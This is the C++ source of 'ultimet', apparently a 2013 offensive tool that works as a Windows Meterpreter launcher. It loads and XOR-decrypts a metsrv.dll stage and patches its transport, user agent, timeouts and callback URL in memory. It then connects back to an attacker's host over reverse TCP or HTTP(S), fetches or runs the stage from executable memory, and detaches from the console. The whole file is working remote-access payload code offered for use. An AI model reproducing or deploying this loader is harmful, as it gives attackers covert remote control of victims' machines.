//��� ���� ������ ������

/************************************************
*					  [ultimet]					*
*		The Ultimate Meterpreter Executable		*
*************************************************		
- @SherifEldeeb
- http://eldeeb.net
- Made in Egypt :)
************************************************/
/*
Copyright (c) 2013, Sherif Eldeeb "eldeeb.net"
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met: 

1. Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer. 
2. Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution. 

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies, 
either expressed or implied, of the FreeBSD Project.
*/
#include "main.h"

int wmain(int argc, wchar_t *argv[])
{
	PAYLOAD_SETTINGS payload_settings = {0};	// That's defined at main.h
	unsigned char* buffer = nullptr;			// This will hold the loaded stage
	unsigned char* TempBuffer = nullptr;		// This will have stuff set-up "like the socket", then the stage will be copied over.
	DWORD bufferSize = 0;						// buffer length
	DWORD StageSize = 0;						// if we're using encryption ... stage size = (bufferSize - 16) 
	DWORD index = 0;							// will be used to locate offset of stuff to be patched "transport, the url ... etc."
	char EncKey[17] = {0};						// XOR Encryption key
	void (*function)() = nullptr;				// The casted-to-be-function after we have everything in place.
	bool FallbackToStager = false;				// If the stage is not bundled in the exe as a resource, or "-f" is not specified, ultimet falls back to work as a stager: if this is true, metsvc will not be availabe. 
	bool metsvc = false;						// Is metsvc chosen as the transport? this will only work if we have the stage upfront, otherwise it will fail.
	int err = 0;								// Errors

	//If "-f" is specified (load stage from local file)
	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, path will be put here. 

	// reverse_metsvc specific Variables
	SOCKET ConnectSocket = INVALID_SOCKET;		// Socket ... will be used for reverse_metsvc and reverse_tcp

	// HTTP(S) Specific Variables
	char url[512] = {0};	//Full URL, 512 bytes are enough. 
	/*************
	Program Start
	*************/
	print_header();								// as it sounds...
	// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct et'all... idea from "http://www.cplusplus.com/forum/articles/13355/"
	for (int i = 1; i < argc; i++) 
	{
		if (i != argc) // Check that we haven't finished parsing already
			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are reverse_tcp, reverse_metsvc, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
				payload_settings.TRANSPORT = argv[i + 1];
				_wcsupr(payload_settings.TRANSPORT); // Wide-String-to-uppercase
				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
				}
				else if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_METSVC") == 0)
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
					metsvc = true;
				}
				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTP") == 0)
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTP";
				}
				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTPS") == 0)
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
				}
				else {
					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_metsvc, reverse_http and reverse_https.\n", payload_settings.TRANSPORT);
					exit(0);
				}
				// End of Transport checks
			} else if (wcscmp(argv[i], L"-h") == 0) {		//LHOST
				payload_settings.LHOST = argv[i + 1];
			} else if (wcscmp(argv[i], L"-p") == 0) {		//LPORT
				payload_settings.LPORT = argv[i + 1];
			} else if (wcscmp(argv[i], L"-ct") == 0) {		//SessionCommunicationTimeout in seconds - 300 by default
				payload_settings.comm_timeout = _wtoi(argv[i + 1]);
			} else if (wcscmp(argv[i], L"-et") == 0) {		//SessionExpirationTimeout in seconds - 604800 by default
				payload_settings.expiration_timeout = _wtoi(argv[i + 1]);
			}  else if (wcscmp(argv[i], L"-ua") == 0) {		//USER_AGENT
				payload_settings.USER_AGENT = argv[i + 1];
			}  else if (wcscmp(argv[i], L"-f") == 0) {		//Should we load the stage from a file rather than from the resource?
				wcscpy_s(StageFilePath,argv[i + 1]);
			}  else if (wcscmp(argv[i], L"--help") == 0) {		//Print usage and quit
				print_header();
				usage();
				exit(1);
			}
	}

	//Do we have the minimum parameters?
	if(payload_settings.TRANSPORT == NULL || payload_settings.LPORT == NULL || payload_settings.LHOST == NULL)
	{
		dprintf(L"[-] Not enough parameters! \n\n");
		usage();
		exit(0);
	}

	//Have we been asked to load the stage from a file?
	if(wcscmp(StageFilePath, L"") != 0)
	{
		dprintf(L"[*] Loading stage into memory from file \"%s\"\n", StageFilePath);
		bufferSize = CopyStageToBuffer(StageFilePath, &buffer);
	} else { // If not, We'll try to load the stage from the resource ...

		// Read resource into buffer ...
		dprintf(L"[*] Loading stage into memory from resource...\n");
		bufferSize = ResourceToBuffer(101, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
		if (bufferSize == 0) // if something went wrong...
		{
			FallbackToStager = true; // We will function in "stager" mode.
			if(metsvc) // Ok, we will fallback to stager mode, however, metsvc will not be available in stager mode ... right?
			{
				dprintf(L"\n[-] Unable to load stage from resource, and \"-f\" not specified ... yet you've chosen reverse_metsvc!\n");
				dprintf(L"    sorry sweetheart, that's not going to work, metsvc *requires* that the stage is available upfront.\n");
				dprintf(L"[-] Use inmet.exe, use \"reverse_tcp\", use another transport, or bundle this exe with metsvc.dll.\n"
					L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
					L" -  You can also load the stage from file system by using \"-f\" switch.\n");
				dprintf(L"[-] ... will exit.\n");
				exit(1);
			} else
			{
				dprintf(L"[!] Couldn't read stage from resource & \"-f\" not speified; falling back to \"stager\" mode...\n"
					L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
					L" -  You can also load the stage from file system by using \"-f\" switch.\n");
			}
		}
	}
	/*///////////////////////////
	/////////////////////////////
	Warning! Program split ahead!
	/////////////////////////////
	/////////////////////////////

	At this given point, we know where the stage is going to be loaded from,
	either from resource (default), file or from the multi/handler, which will be handled differently.

	========
	Wrapping up what happened so far:
	if(-f specified)
		load_stager_from_file
			else
				load_stage_from_resource

	---
	buffer == stage?;
	if (failed?) set FallbackToStager = true;

	if(FallbackToStager){
		Act as a "regular" stand-alone meterpreter exe;
			populate buffer,
				if(tcp) adjust buffer usng ASM voodoo;
	} else {
		buffer already has the stage,
			decrypt it,
				patch it, 
					do your stuff (socket, url building ..etc.)
	}
	now buffer == stage!!
	((void (*)())buffer)();
	_____________________
	Ready? let's do it...
	*/

	if(FallbackToStager)
		//--------- Start of "working as a stager" ------------//
	{

		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
		{
			StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
		} 
		else 
		{
			StagerReverseHTTP(payload_settings.LHOST,payload_settings.LPORT,payload_settings.TRANSPORT);
		}
	}
		//--------- End of "working as a stager" ------------//
	
	
	else //This is where "working as an inline stand-alone exe" stuff starts...
	{
		//Is the stage encrypted?
		if(memcmp(&buffer[0],"MZ",2))
		{
			dprintf(L"[!] Looks like loaded stage is encrypted, Locating Encryption key...\n");
			GetKeyFromBuffer(buffer, EncKey, 16);
			printf("[*] \"%s\" will be used; decrypting...\n", EncKey);
			XORcrypt(buffer, EncKey, bufferSize);
			if(memcmp(&buffer[16],"MZ",2))
			{
				dprintf(L"[-] Something went really wrong: bad resource, wrong encryption key, or maybe something else ... will exit!\n");
				exit(0);
			}
			dprintf(L"[*] Looks like stage decrypted correctly, proceeding to patching stage...\n");
			buffer = buffer + 16;
			StageSize = bufferSize - 16;
		} else {
			dprintf(L"[*] Looks like loaded stage is a regular DLL, proceeding to patching stage..\n");
			StageSize = bufferSize;
		}

		/////////////////////////////////////////
		/****************************************
		*		Patching Stage in memory.		*
		****************************************/
		/////////////////////////////////////////

		// Patching transport 
		index = binstrstr(buffer, (int)StageSize, (unsigned char*)global_meterpreter_transport, (int)strlen(global_meterpreter_transport));
		if (index == 0) // if the transport is not found ...
		{
			dprintf(L"[-] Couldn't locate transport string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
			exit(0);
		}
		dprintf(L"[*] Patching transport: Offset 0x%08x ->  \"%s\"\n", index, payload_settings.TRANSPORT );
		PatchString(buffer, payload_settings.TRANSPORT, index, wcslen(payload_settings.TRANSPORT));

		// Patching ReflectiveDLL bootstrap 
		index = 0;  //rewind
		dprintf(L"[*] Patching ReflectiveDll Bootstrap: \"MZ\" Offset 0x%08x\n", index);	
		memcpy(buffer, ReflectiveDllBootStrap, 62);//overwrite dos header with the ReflectiveDll bootstrap

		//////////////////////////////////////////
		//  Stuff needed for HTTP/HTTPS only!!  //
		//////////////////////////////////////////
		if((wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0) || (wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTPS") == 0))
		{

			//Patching UserAgent
			index = 0; //rewind.
			index = binstrstr(buffer, (int)StageSize, (unsigned char*)global_meterpreter_ua, (int)strlen(global_meterpreter_ua));
			if (index == 0) // if the UA is not found ...
			{
				dprintf(L"[-] Couldn't locate UA string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
				exit(0);
			}
			if(payload_settings.USER_AGENT == NULL)
			{
				dprintf(L"[!] No UserAgent specified, using default one ...\n");
				payload_settings.USER_AGENT = L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0\x00";
			}
			dprintf(L"[*] Patching UA: Offset 0x%08x -> \"%s\"\n", index, payload_settings.USER_AGENT);
			PatchString(buffer, payload_settings.USER_AGENT, index, wcslen(payload_settings.USER_AGENT));

			//Patching global expiration timeout.
			index = 0; //rewind
			index = binstrstr(buffer, (int)StageSize, (unsigned char*)"\x61\xe6\x4b\xb6", 4); //int *global_expiration_timeout = 0xb64be661; little endian, metsrv.dll 
			if (index == 0) // if the global_expiration_timeout is not found ...
			{
				dprintf(L"[-] Couldn't locate global_expiration_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
				exit(0);
			}

			if(payload_settings.expiration_timeout == NULL)
			{
				dprintf(L"[!] No expiration_timeout specified, using 60400 seconds ...\n");
				payload_settings.expiration_timeout = 60400;
			}
			dprintf(L"[*] Patching global_expiration_timeout: Offset 0x%08x -> \"%d\" seconds\n", index, payload_settings.expiration_timeout);
			memcpy(&buffer[index], &payload_settings.expiration_timeout, 4);

			//Patching global_comm_timeout.
			index = 0; //rewind
			index = binstrstr(buffer, (int)StageSize, (unsigned char*)"\x7f\x25\x79\xaf", 4); //int *global_comm_timeout = 0xaf79257f; little endian, metsrv.dll 
			if (index == 0) // if the global_expiration_timeout is not found ...
			{
				dprintf(L"[-] Couldn't locate global_comm_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
				exit(0);
			}

			if(payload_settings.comm_timeout == NULL)
			{
				dprintf(L"[!] No comm_timeout specified, using 300 seconds ...\n");
				payload_settings.comm_timeout = 300;
			}
			dprintf(L"[*] Patching global_comm_timeout: Offset 0x%08x -> \"%d\" seconds\n", index, payload_settings.comm_timeout);
			memcpy(&buffer[index], &payload_settings.comm_timeout, 4);
		}

		/*
		*	Preparing connection...
		*/
		// Are we reverse_metsvc?
		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
		{
			if(!metsvc) //Are we METERPRETER_TRANSPORT_SSL but not metsvc? note that reverse_tcp AND reverse_metsvc use the same transport, it's the exploit/multi/handler that will make the difference.
			{
				// If we reached this far, it means that the stage is loaded, transport is SSL, yet metsvc is still false "not chosen", even though we have the stage
				// That means stage will be loaded AGAIN over network, next time, they should chose reverse_metsvc.
				// However, The customer is always right, right? let's connect them to their beloved reverse_tcp in stager mode nevertheless.
				// ... but we have to tell them what they've done wrong.
				dprintf(L"\n[!] We already have the stage, why did you chose reverse_tcp? you could've picked reverse_metsvc.\n" 
					L"    next time use \"-t reverse_metsvc\" -> \"exploit/multi/handler/windows/metsvc_reverse_tcp\".\n"
					L" -  anyway, will assume you know what you're doing and connect to reverse_tcp in *stager* mode...\n\n");
					
				dprintf(L"[*] \nMake sure you have \"windows/meterpreter/reverse_tcp\" handler running.\n\n");
				
				// Let's just fallback to stager mode ... you foolish noisy bandwidth wasters.
				StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
				// see you on the other side :)
			} 
			// we are METERPRETER_TRANSPORT_SSL, we have the stage, and metsvc is true :)

			// Adjusting buffer .. this is important!
			// reverse_metsvc has extra requirements ... the stage needs to be preceeded with `0xBF + 4 bytes of a valid socket connected to the handler` 
			// My approach to acheive this: We'll first VirtualAlloc size + 5 bytes to another buffer "TempBuffer", skip 5 bytes, then copy the contents 
			// of "buffer" over, then point buffer to that new TempBuffer ... then take it from there.
			TempBuffer = (unsigned char*)VirtualAlloc(0, StageSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			memcpy(TempBuffer + 5, buffer, StageSize);		//skiping first five bytes, then copying buffer contents ...
			buffer = TempBuffer;							//Got it? I'm sure there's a better way to do that, but I'm not smart enough to figure out how yet :).
			//////////////////////////////////////////////////

			dprintf(L"\n[*] Make sure you have \"windows/metsvc_reverse_tcp\" handler running.\n\n");
			ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
			if (ConnectSocket == INVALID_SOCKET)
			{
				dprintf(L"[-] Failed to connect ... will exit!\n");
				exit(1);
			}
			dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buffer);
			buffer[0] = 0xBF;
			dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
			memcpy(buffer+1, &ConnectSocket, 4);
		} 

		// Are we reverse_http(s)?
		else if((wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0) || (wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTPS") == 0))
		{
			/*
			Building the URL
			*/
			int checksum = 0;			//Calculated Checksum placeholder. 
			char URI_Part_1[5] = {0};	//4 chars ... it can be any length actually.
			char URI_Part_2[17] = {0};	//16 random chars.
			srand ( (UINT)time(NULL) );	//Seed rand() 

			while(true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
			{
				gen_random(URI_Part_1, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounded just fine.
				checksum = TextChecksum8(URI_Part_1);	//Get the 8-bit checksum of the random value
				if(checksum == URI_CHECKSUM_CONN)		//If the checksum == 98, it will be handled by the multi/handler correctly as a "CONN_" and will be short fused into a session.
				{
					break; // We found a random string that checksums to 98
				}
			}
			gen_random(URI_Part_2, 16);	//get second part, random 16 chars

			//Let's build the complete uri, it should look like http(s)://LHOST:LPORT/CHECKSUM8(98)_XXXXXXXXXXXXXXXX/
			//HTTP? HTTPS?
			if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0)
				strcat_s(url, "http://");
			else
				strcat_s(url, "https://");

			//The joys of converting between wchar_t and char ...
			char tempChar1[512] = {0}; //This is used for converting from wchar_t to char... 
			char tempChar2[512] = {0}; //This is used for converting from wchar_t to char... 

			wcstombs_s(NULL,tempChar1,payload_settings.LHOST, wcslen(payload_settings.LHOST)); //convert the LHOST to char
			wcstombs_s(NULL,tempChar2,payload_settings.LPORT, wcslen(payload_settings.LPORT)); //convert the LPORT to char

			//wide-char conversion happiness ends here... building the url...
			strcat_s(url,tempChar1);	// "http(s)://LHOST"
			strcat_s(url,":");			// "http(s)://LHOST:"
			strcat_s(url,tempChar2);	// "http(s)://LHOST:LPORT"
			strcat_s(url,"/");			// "http(s)://LHOST:LPORT/"
			strcat_s(url,URI_Part_1);	// "http(s)://LHOST:LPORT/CONN"
			strcat_s(url,"_");			// "http(s)://LHOST:LPORT/CONN_"
			strcat_s(url,URI_Part_2);	// "http(s)://LHOST:LPORT/CONN_XXXXXXXXXXXX"
			strcat_s(url,"/\0");		// "http(s)://LHOST:LPORT/CONN_XXXXXXXXXXXX/"
			//Thanks for waiting... :)

			wchar_t temp[512] = {0};
			mbstowcs_s(NULL,temp,url,strlen(url));
			dprintf(L"[*] Calculated URL: %s\n",temp);

			//Patching URL ...
			index = 0; //Rewind
			index = binstrstr(buffer, (int)bufferSize, (unsigned char*)global_meterpreter_url, (int)strlen(global_meterpreter_url));
			if (index == 0) // if the global_meterpreter_url is not found ...
			{
				dprintf(L"[-] Couldn't locate global_meterpreter_url string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
				exit(0);
			}
			dprintf(L"[*] Patching global_meterpreter_url: Offset 0x%08x ->  \"%s\"\n", index, temp );
			memcpy(&buffer[index], &url, strlen(url)+1); //+1 to make sure it'll be null terminated, otherwise it will end with 'X'
		}
	}

	dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
	function = (void (*)())buffer;

	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
	FreeConsole();
	function();
	return 0;
}
